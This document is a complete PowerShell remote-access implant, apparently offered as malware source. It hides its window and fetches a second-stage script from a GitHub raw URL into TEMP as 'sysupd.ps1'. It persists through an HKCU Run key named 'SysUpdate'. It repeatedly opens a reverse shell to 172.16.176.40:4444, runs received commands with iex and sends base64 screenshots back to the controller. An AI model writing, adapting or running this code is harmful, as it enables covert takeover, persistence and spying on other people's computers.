$m = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -PassThru
$m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# 2. Setup Aliases for convenience (Linux-style commands)
if (-not (Get-Command touch -ErrorAction SilentlyContinue)) { New-Alias -Name touch -Value New-Item -Force }

# 3. Persistence - HKCU Run Key
$gh = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1'
$tmp = "$env:TEMP\sysupd.ps1"
if (-not (Test-Path $tmp)) { try { iwr $gh -OutFile $tmp -UseBasicParsing } catch {} }
$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
if (-not (Get-ItemProperty $reg -Name "SysUpdate" -ErrorAction SilentlyContinue)) { 
    Set-ItemProperty $reg -Name "SysUpdate" -Value "powershell.exe -WindowStyle Hidden -File $tmp" 
}

# 4. Main Connection Loop
while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
        $s = $c.GetStream()
        $e = New-Object System.Text.UTF8Encoding
        
        $p = $e.GetBytes("`n[+] Connection Established. Commands: screenshot, kill, touch`nPS $PWD> ")
        $s.Write($p, 0, $p.Length)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $input = $e.GetString($b, 0, $i).Trim()
            $out = ""

            if ($input -eq 'kill') {
                # Cleanup and Exit
                Remove-ItemProperty -Path $reg -Name "SysUpdate" -Force -ErrorAction SilentlyContinue
                Stop-Process -Id $PID -Force
            } 
            elseif ($input -eq 'screenshot') {
                try {
                    # Capture Screen
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                    $bmp = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bmp.Size)
                    
                    # Convert to Base64 String
                    $ms = New-Object System.IO.MemoryStream
                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                    $base64 = [Convert]::ToBase64String($ms.ToArray())
                    
                    $out = "`n---BEGIN SCREENSHOT---`n$base64`n---END SCREENSHOT---`n"
                    
                    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                } catch { $out = "[!] Screenshot Error: $($_.Exception.Message)`n" }
            }
            else {
                # Normal Command Execution
                $out = try { if ($input) { iex $input 2>&1 | Out-String } } catch { $_.Exception.Message }
            }

            # Send Output back to C2
            $resp = $e.GetBytes($out + "PS $PWD> ")
            $s.Write($resp, 0, $resp.Length)
            $s.Flush()
        }
    } catch { Start-Sleep 5 }
}
